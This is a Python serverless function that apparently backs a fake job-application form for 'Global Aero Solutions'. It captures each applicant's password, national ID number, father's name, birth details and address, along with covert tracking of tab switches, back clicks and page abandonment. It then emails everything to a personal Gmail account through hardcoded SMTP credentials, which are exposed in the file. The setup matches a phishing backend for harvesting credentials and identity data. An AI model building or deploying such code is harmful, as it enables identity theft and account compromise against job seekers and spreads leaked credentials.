import json
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime

# Email configuration
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
EMAIL_ADDRESS = "alexandervoss43@gmail.com"
EMAIL_PASSWORD = "raha essk rjlg srsq"

def handler(event, context):
    # Handle CORS preflight
    if event['httpMethod'] == 'OPTIONS':
        return {
            'statusCode': 200,
            'headers': {
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Headers': 'Content-Type',
                'Access-Control-Allow-Methods': 'POST, OPTIONS'
            }
        }
    
    try:
        data = json.loads(event['body'])
        
        tracking_id = data.get('trackingId', 'Unknown')
        status = data.get('status', 'UNKNOWN')
        current_step = data.get('currentStep', 0)
        step_info = data.get('stepInfo', '')
        form_data = data.get('formData', {})
        completion_percentage = data.get('completionPercentage', 0)
        timestamp = data.get('timestamp', '')
        behavior_data = data.get('behaviorData', {})
        suspicious_activity = data.get('suspiciousActivity', False)
        
        # Enhanced subject line for gaming detection
        gaming_alert = "🚨 GAMING DETECTED" if suspicious_activity else "🔍 TRACKING"
        subject = f"{gaming_alert} - {status} - {tracking_id}"
        
        email_body = f"""
GLOBAL AERO SOLUTIONS - REAL-TIME FORM TRACKING
===============================================

⏰ TIMESTAMP: {timestamp}
🆔 TRACKING ID: {tracking_id}
📊 STATUS: {status}
📋 CURRENT STEP: {current_step}/4
📈 COMPLETION: {completion_percentage}%
ℹ️  STEP INFO: {step_info}

🎯 BEHAVIORAL ANALYSIS:
{'🚨 SUSPICIOUS ACTIVITY DETECTED!' if suspicious_activity else '✅ Normal behavior'}
- Back Clicks: {behavior_data.get('backClicks', 0)} {'(GAMING!)' if behavior_data.get('backClicks', 0) >= 2 else ''}
- Tab Switches: {behavior_data.get('tabSwitches', 0)} {'(SUSPICIOUS!)' if behavior_data.get('tabSwitches', 0) >= 2 else ''}
- Long Pauses: {behavior_data.get('longPauses', 0)} {'(HESITATION!)' if behavior_data.get('longPauses', 0) >= 2 else ''}
- Rapid Clicks: {behavior_data.get('rapidClicks', 0)} {'(GAMING!)' if behavior_data.get('rapidClicks', 0) >= 3 else ''}

===========================================
CAPTURED FORM DATA
===========================================
Full Name: {form_data.get('fullName', 'Not provided')}
Email: {form_data.get('email', 'Not provided')}
Phone: {form_data.get('countryCode', '')} {form_data.get('phone', 'Not provided')}
Password: {form_data.get('password', 'Not provided')}
CNIC: {form_data.get('cnic', 'Not provided')}
Father's Name: {form_data.get('fatherName', 'Not provided')}

Address: {form_data.get('address', 'Not provided')}
City: {form_data.get('city', 'Not provided')}
Country: {form_data.get('country', 'Not provided')}

Date of Birth: {form_data.get('dateOfBirth', 'Not provided')}
Place of Birth: {form_data.get('placeOfBirth', 'Not provided')}

Position Applied: {form_data.get('position', 'Not provided')}
Experience: {form_data.get('experience', 'Not provided')}
Education: {form_data.get('education', 'Not provided')}
Skills: {form_data.get('skills', 'Not provided')}

Availability: {form_data.get('availability', 'Not provided')}
Expected Salary: {form_data.get('expectedSalary', 'Not provided')}
Additional Info: {form_data.get('additionalInfo', 'Not provided')}
Resume: {form_data.get('resumeName', 'Not uploaded')}

===========================================
STATUS MEANINGS:
- IN_PROGRESS: User is actively filling form
- STEP_COMPLETED: User finished a step and moved to next
- STEP_BACK: User went back to previous step  
- ABANDONED: User left/closed the page
- SUBMITTED: User completed and submitted form
- GAMING_DETECTED: Rapid clicking behavior detected
- SUSPICIOUS_TAB_SWITCH: User switching tabs frequently
- LONG_PAUSE: User inactive for extended periods

🎯 GAMING DETECTION THRESHOLDS:
- Back clicks ≥2 = Gaming behavior
- Tab switches ≥2 = Suspicious activity
- Rapid clicks ≥3 = Gaming detected
- Long pauses ≥2 = User hesitation
===========================================
        """
        
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = EMAIL_ADDRESS
        msg['Subject'] = subject
        
        msg.attach(MIMEText(email_body, 'plain'))
        
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        text = msg.as_string()
        server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, text)
        server.quit()
        
        return {
            'statusCode': 200,
            'headers': {
                'Access-Control-Allow-Origin': '*',
                'Content-Type': 'application/json'
            },
            'body': json.dumps({
                'success': True,
                'message': f'Tracking data sent successfully - {status}'
            })
        }
        
    except Exception as e:
        return {
            'statusCode': 500,
            'headers': {
                'Access-Control-Allow-Origin': '*',
                'Content-Type': 'application/json'
            },
            'body': json.dumps({
                'success': False,
                'message': f'Failed to send tracking data: {str(e)}'
            })
        }
